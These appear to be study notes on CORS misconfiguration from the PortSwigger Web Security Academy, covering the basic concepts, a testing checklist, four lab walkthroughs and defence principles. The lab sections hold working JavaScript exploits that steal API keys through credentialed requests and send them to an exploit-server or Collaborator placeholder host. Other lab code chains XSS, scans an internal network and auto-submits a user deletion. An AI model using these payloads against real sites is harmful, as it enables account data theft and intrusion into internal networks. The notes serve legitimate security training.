# CORS Notes — PortSwigger Web Security Academy

---

## WHAT IS CORS?

CORS (Cross-Origin Resource Sharing) is a browser mechanism that controls
whether JavaScript running on one origin can read the response from a
request made to a DIFFERENT origin.

It exists to safely RELAX a much stricter, older browser rule: the
**Same-Origin Policy (SOP)**.

```
Origin = scheme + domain + port

https://example.com         and  https://example.com:8080   → different origins (port)
https://example.com         and  http://example.com          → different origins (scheme)
https://example.com         and  https://sub.example.com      → different origins (subdomain)
```

> 📝 The Same-Origin Policy is the browser's default behaviour: JavaScript on
> origin A is allowed to SEND a request to origin B, but the browser blocks
> the JavaScript from READING the response. CORS is what selectively lifts
> that block, when the server hosting origin B explicitly says it's okay.

---

## SOP vs CORS — WHAT EACH ONE ACTUALLY CONTROLS

| | Same-Origin Policy (SOP) | CORS |
|---|---|---|
| Default behaviour | Blocks reading cross-origin responses | Selectively un-blocks it |
| Who decides | The browser, always | The SERVER, via response headers |
| Can the request still be SENT? | Yes — SOP doesn't stop the request itself | N/A — same |
| What's actually protected | The RESPONSE data | The RESPONSE data |

> 📝 This is the single most misunderstood part of CORS: **the cross-origin
> request still goes out and the server still processes it**, even without
> any CORS headers at all. SOP only stops the ATTACKER'S JAVASCRIPT from
> reading the response. This is why CORS misconfigurations matter so much —
> they don't create a NEW request capability, they just remove the browser's
> restriction on reading what comes back.

---

## THE KEY RESPONSE HEADERS

| Header | Meaning |
|---|---|
| `Access-Control-Allow-Origin` | Which origin(s) are allowed to read this response |
| `Access-Control-Allow-Credentials` | If `true`, cookies/session credentials are included in the cross-origin request AND the response is readable |
| `Access-Control-Allow-Methods` | Which HTTP methods are permitted cross-origin |
| `Access-Control-Allow-Headers` | Which request headers the client may send cross-origin |
| `Vary: Origin` | Tells caches the response differs depending on the `Origin` request header — important when `Access-Control-Allow-Origin` is dynamically generated |

> 📝 `Access-Control-Allow-Credentials: true` is the header that turns a CORS
> misconfiguration from "mildly interesting" into "fully exploitable account
> takeover." Without it, the victim's cookies are never sent on the
> cross-origin request, so even if the attacker can read the response, the
> response is just anonymous/public data — nothing tied to the victim.

---

## DISTINCT CORS MISCONFIGURATION PATTERNS

### 1. Arbitrary origin reflection
The server reads whatever `Origin` header the request includes and reflects
it directly back as `Access-Control-Allow-Origin`, with no validation at all.

```
Request:   Origin: https://anything-i-want.com
Response:  Access-Control-Allow-Origin: https://anything-i-want.com
           Access-Control-Allow-Credentials: true
```
This trusts literally every origin on the internet — functionally identical
to having no CORS policy at all, except now it's WORSE because credentials
are included.

### 2. Trusting the `null` origin
Some specific browser contexts (sandboxed iframes, `file://` documents,
certain redirect chains) send `Origin: null` instead of a real origin. If the
server explicitly whitelists `null`, an attacker can deliberately put their
exploit inside one of these contexts to generate that exact header value.

```html
<iframe sandbox="allow-scripts" srcdoc="<script>
  // this iframe's requests carry Origin: null
</script>"></iframe>
```

### 3. Trusting all subdomains regardless of protocol
The server's origin whitelist matches any subdomain, but doesn't enforce
HTTPS — it'll happily trust `http://anything.target.com` just as much as
`https://anything.target.com`.

```
Request:   Origin: http://insecure-subdomain.target.com
Response:  Access-Control-Allow-Origin: http://insecure-subdomain.target.com
```
This matters because plain HTTP traffic can be intercepted/modified by
anyone on the network path (a MITM position) — or, when MITM isn't available
to the attacker, exploited indirectly by finding an XSS vulnerability
somewhere on one of those trusted subdomains.

### 4. Trusting internal network origins
The server trusts requests from private/internal IP ranges (like
`192.168.0.0/24`), assuming "if it's coming from inside the network, it must
be safe." But a victim's BROWSER can be tricked into making requests on the
attacker's behalf — using the victim as a proxy into a network the attacker
could never reach directly.

```
Request (from victim's browser, made by attacker's JS):
  Origin: http://192.168.0.50:8080
Response:
  Access-Control-Allow-Origin: http://192.168.0.50:8080
```
The attacker never touches the internal network directly — the victim's
browser does all the work, simply because it happens to be sitting inside
that network when it loads the malicious page.

---

## WHY THESE ARE EXPLOITABLE — THE TRUST CHAIN

```
1. The victim is logged in to the target site (has a valid session cookie)
2. The victim's browser visits the attacker's page (any origin)
3. The attacker's JS makes a credentialed cross-origin request to the target
4. The browser attaches the victim's cookies automatically (just like CSRF)
5. The target's CORS policy says "this origin is allowed to read the response"
6. The browser hands the response — containing the victim's private data —
   directly to the attacker's JavaScript
```

> 📝 Step 4 should look familiar — it's the exact same browser behaviour that
> makes CSRF possible (cookies are attached automatically to any request to
> a domain, regardless of where the request originated). The difference is
> what happens next: CSRF can't READ the response, just trigger an action.
> CORS misconfiguration lets the attacker READ the response too — which is
> why CORS bugs are often rated more severely than CSRF for the same endpoint.

---

## CORS AND XSS TRUST RELATIONSHIPS

Even a "correctly" configured CORS policy creates a trust relationship
between two origins. If Origin B is whitelisted by Origin A, and Origin B
has an XSS vulnerability, an attacker can:

```
1. Find XSS on the TRUSTED origin (subdomain, partner site, etc.)
2. Inject JS via that XSS
3. That injected JS makes a CORS request to the MAIN target
4. Because it's running ON the trusted origin, the request carries that
   origin's value → CORS policy allows it → response is readable
```

This is why a CORS whitelist is only as strong as the WEAKEST origin on it.
Whitelisting `*.yourcompany.com` means trusting the security of EVERY
subdomain that exists now — and every one anyone ever spins up in the future.

---

## CORS TESTING SOP

### Step 1 — Find a credentialed, sensitive endpoint
- Log in, browse the app, identify any endpoint that returns sensitive data
  tied to your session (API keys, account details, personal info)
- Check the response headers for `Access-Control-Allow-Credentials: true` —
  this is the single strongest signal that CORS is in play here at all

### Step 2 — Probe the Origin reflection behaviour
- Send the request to Burp Repeater
- Add `Origin: https://example.com` (or any arbitrary value)
- Check whether it's reflected back in `Access-Control-Allow-Origin`

### Step 3 — Test the null origin
- Resend with `Origin: null`
- If trusted, you have a viable (if slightly more awkward) exploitation path

### Step 4 — Test subdomain/protocol leniency
- Resend with `Origin: http://random-subdomain.target.com` (note: HTTP, not HTTPS)
- If reflected, the policy is too permissive on both subdomain matching and protocol

### Step 5 — Test internal network trust (if applicable)
- Resend with `Origin: http://192.168.0.1` or similar private-range values
- If reflected with credentials allowed, the app may be vulnerable to an
  internal-network pivot attack via the victim's browser

### Step 6 — Confirm credentials are actually included
- `Access-Control-Allow-Origin` reflection alone isn't enough — confirm
  `Access-Control-Allow-Credentials: true` is ALSO present
- Without it, the browser won't send cookies cross-origin and the attack has
  no access to session-specific data

### Step 7 — Build and deliver the exploit
- Write JS that makes a credentialed cross-origin `XMLHttpRequest`/`fetch` to
  the vulnerable endpoint
- Exfiltrate the response (commonly via a redirect to a URL containing the
  stolen data, or a `fetch` to your own logging endpoint)
- Host on the exploit server, deliver to the victim

---

## QUICK BURP WORKFLOW

1. Log in, browse to any page returning sensitive session-bound data
2. Find the relevant request in **Proxy > HTTP history**, send to **Repeater**
3. Add/modify the `Origin` header with each test value from the SOP above
4. Check the response headers after each send: `Access-Control-Allow-Origin`
   and `Access-Control-Allow-Credentials`
5. Once confirmed, write the exploit JS and use the **exploit server** to
   host and deliver it to the simulated victim
6. For internal-network labs, your exploit JS itself does the scanning — use
   **Burp Collaborator** (or the exploit server's own access log) to receive
   exfiltrated results out-of-band

> 📝 The **additional-cors-checks** BApp (PortSwigger's own extension) and
> Param Miner both help automate the origin-reflection probing across an
> entire site — useful once you're past the manual-testing learning phase
> and want to scan more efficiently in real engagements.

---
---

## PORTSWIGGER LABS

---

### #01 — CORS vulnerability with basic origin reflection

**URL:** https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack
**Vulnerability:** `/accountDetails` reflects ANY `Origin` header value back in `Access-Control-Allow-Origin`, with `Access-Control-Allow-Credentials: true`
**Aim:** Steal the administrator's API key

**Background:**
Visiting your account page triggers an AJAX call to `/accountDetails`, which
returns your API key. The response includes
`Access-Control-Allow-Credentials: true` — a strong signal CORS is active.

**Analysis:**
```
GET /accountDetails
Origin: https://example.com
→ 200 OK
   Access-Control-Allow-Origin: https://example.com
   Access-Control-Allow-Credentials: true
   {"apikey": "..."}

The server trusts ANY origin — it just reflects back whatever you send.
```

**Exploit (hosted on the exploit server):**
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://TARGET.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
    location = '/log?key=' + this.responseText;
}
</script>
```

**Steps:**
1. Log in as `wiener:peter`, view `/my-account`, capture the `/accountDetails` request
2. Send to Repeater, add `Origin: https://example.com`, confirm it's reflected
3. Build the exploit above, host it on the exploit server, deliver to victim
4. Check the exploit server's access log for the exfiltrated key

> 📝 `req.withCredentials = true` is the critical line — without it, the
> browser would send the cross-origin request WITHOUT the victim's session
> cookie, and the server would just return an empty/unauthenticated response.

---

### #02 — CORS vulnerability with trusted null origin

**URL:** https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack
**Vulnerability:** The server explicitly whitelists `Origin: null`
**Aim:** Steal the administrator's API key

**Background:**
Some applications whitelist the literal string `null` as a trusted origin —
often because developers know certain legitimate contexts (sandboxed
documents, some redirect flows) generate this value, and they (incorrectly)
assume it can't be abused by an attacker.

**Analysis:**
```
GET /accountDetails
Origin: null
→ 200 OK
   Access-Control-Allow-Origin: null
   Access-Control-Allow-Credentials: true
```

An attacker can deliberately generate a request carrying `Origin: null` by
placing their exploit inside a **sandboxed iframe**.

**Exploit (hosted on the exploit server):**
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://TARGET.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
    location = '/log?key=' + this.responseText;
}
</script>"></iframe>
```

> 📝 The `sandbox` attribute on an `<iframe>` deliberately strips the framed
> content of its normal origin — that's WHY it ends up sending `Origin: null`.
> This is a great example of using a browser SECURITY feature (sandboxing) as
> the exact mechanism that satisfies an attacker's needs, because the server
> trusts the wrong thing.

---

### #03 — CORS vulnerability with trusted insecure protocols

**URL:** https://portswigger.net/web-security/cors/lab-breaking-https-attack
**Vulnerability:** The server trusts ALL subdomains regardless of protocol (HTTP or HTTPS)
**Aim:** Steal the administrator's API key, without a MITM position

**Background:**
The CORS policy trusts any subdomain of the target, but doesn't require
HTTPS. Normally this would be exploited via a man-in-the-middle attack on the
victim's plaintext HTTP traffic to an insecure subdomain — but the lab
environment doesn't allow MITM. The alternative: find an XSS vulnerability
ON one of those trusted subdomains and use it to host your exploit there
instead, satisfying the origin check from the inside.

**Analysis:**
```
GET /accountDetails
Origin: http://stock.TARGET.web-security-academy.net
→ 200 OK
   Access-Control-Allow-Origin: http://stock.TARGET.web-security-academy.net
   Access-Control-Allow-Credentials: true

The "stock checker" subdomain has reflected XSS via the productId parameter.
```

**Exploit chain:**
```html
<!-- Hosted on the exploit server: redirects the victim to the vulnerable
     subdomain with an XSS payload injected via productId -->
<script>
document.location =
  "http://stock.TARGET.web-security-academy.net/?productId=" +
  encodeURIComponent(`<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
      location = 'https://EXPLOIT-SERVER/log?key=' + this.responseText;
    };
    req.open('get','https://TARGET.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
  </script>`) + "&storeId=1";
</script>
```

**Steps:**
1. Confirm `Origin: http://anything.TARGET...` (HTTP, not HTTPS) is trusted
2. Find the subdomain used for "check stock" functionality
3. Confirm reflected XSS in its `productId` parameter
4. Chain: redirect victim to the subdomain with the CORS-exfiltration script
   injected as the XSS payload
5. Deliver via exploit server, check the access log for the leaked key

> 📝 This lab is a perfect illustration of the "trust chain" concept from
> earlier in these notes: the CORS policy ITSELF wasn't directly exploitable
> without a MITM position, but the policy's trust in an ENTIRE subdomain
> meant that subdomain's own vulnerabilities (XSS) became exploitable as a
> CORS bypass too.

---

### #04 — CORS vulnerability with internal network pivot attack

**URL:** https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack
**Vulnerability:** The server trusts any origin from the internal network range (`192.168.0.0/24`)
**Aim:** Use the victim's browser as a pivot to find and exploit an internal admin panel, deleting `carlos`

**Background:**
The most advanced CORS lab. The attacker has NO direct access to the
internal network — but the VICTIM's browser, if it happens to be on that
network, can be used as an unwitting proxy. The exploit runs in stages,
entirely from the victim's browser, with results exfiltrated out-of-band via
Burp Collaborator.

**Stage 1 — scan the internal network to find a live host:**
```html
<script>
collaboratorURL = 'https://YOUR-COLLABORATOR-ID.oastify.com';
for (let i = 0; i < 256; i++) {
    fetch('http://192.168.0.' + i + ':8080')
        .then(r => r.text())
        .then(text => {
            fetch(collaboratorURL + '?ip=192.168.0.' + i + '&code=' + encodeURIComponent(text));
        })
        .catch(() => {});
}
</script>
```
Poll Collaborator — exactly one IP responds, revealing an internal admin
login page's HTML.

**Stage 2 — the discovered login page has reflected XSS in its username field.**
Inject an XSS payload that, once it runs INSIDE that internal origin, makes
its own CORS request — fully trusted because it's coming from the internal
network the target already trusts.

**Stage 3 — use the injected XSS to auto-submit a login as `carlos` (or
extract the admin page source first to find the delete mechanism):**
```html
<script>
var url = "http://192.168.0.X:8080";   // the IP discovered in Stage 1
fetch(url).then(r => r.text()).then(text => {
    var csrf = text.match(/csrf" value="([^"]+)"/)[1];
    var xssPayload =
      '"><iframe src=/admin onload="' +
        'var f=this.contentWindow.document.forms[0];' +
        'if(f.username) f.username.value=\\'carlos\\', f.submit()' +
      '">';
    location = url + '/login?username=' + encodeURIComponent(xssPayload) +
               '&password=test&csrf=' + csrf;
});
</script>
```

**Steps:**
1. Build and deliver the network-scanning script (Stage 1) via the exploit server
2. Poll Collaborator to find the live internal IP and inspect the disclosed
   login page HTML
3. Confirm the login form's `username` field is vulnerable to XSS
4. Build a second exploit (Stage 2/3) targeting that specific IP — inject an
   `<iframe src=/admin>` payload that, once the iframe loads the (already
   authenticated, internal-trusted) admin page, auto-submits a delete
   request for `carlos`
5. Deliver, confirm `carlos` is deleted

> 📝 This is the clearest possible demonstration of why "trust the internal
> network" is a dangerous CORS policy: the attacker never makes a single
> request to `192.168.0.0/24` themselves — every request in this entire
> chain originates from the VICTIM's browser. The internal network's own
> trust in itself becomes the attacker's weapon, entirely by proxy.

---

## REFERENCE — CORS VULNERABILITY QUICK MAP

| Lab pattern | What's broken | Fix |
|---|---|---|
| Arbitrary origin reflection | No validation of `Origin` at all — anything is reflected | Maintain an explicit, server-side whitelist of trusted origins |
| Trusted `null` origin | `null` whitelisted as if it were a "safe" value | Never whitelist `null` — it's trivially generated by an attacker via sandboxed contexts |
| Trusted insecure protocols | Subdomain whitelist doesn't enforce HTTPS | Match origins exactly, including scheme — never allow `http://` when the app is HTTPS-only |
| Trusted internal network | Origin trust based on IP range, not actual identity | Never use network location as a substitute for authentication; CORS should never be the only access control on sensitive internal functionality |

---

## REFERENCE — DEFENCE PRINCIPLES

1. **Use an explicit server-side whitelist of trusted origins** — never
   dynamically reflect whatever `Origin` header arrives
2. **Never whitelist `null`** — it can be generated by an attacker at will
   via sandboxed iframes or other browser quirks
3. **Match the full origin exactly** — scheme, domain, AND port — don't allow
   HTTP when your app is HTTPS, and don't blanket-trust every subdomain
4. **Don't rely on network location as authentication** — CORS trust for
   "internal" origins is not a substitute for real authentication and
   authorization on sensitive endpoints
5. **Always pair a dynamic `Access-Control-Allow-Origin` with `Vary: Origin`**
   — otherwise caching infrastructure can serve one user's permissive CORS
   response to a completely different user
6. **Remember CORS is a BROWSER mechanism, not a server-side access
   control** — a non-browser client (curl, `requests`, Burp) can ignore CORS
   entirely and read any response it wants. CORS misconfigurations are
   specifically about what's exposed to an ATTACKER'S JAVASCRIPT running in
   a VICTIM'S browser — sensitive endpoints still need their own
   authentication and authorization regardless of CORS policy
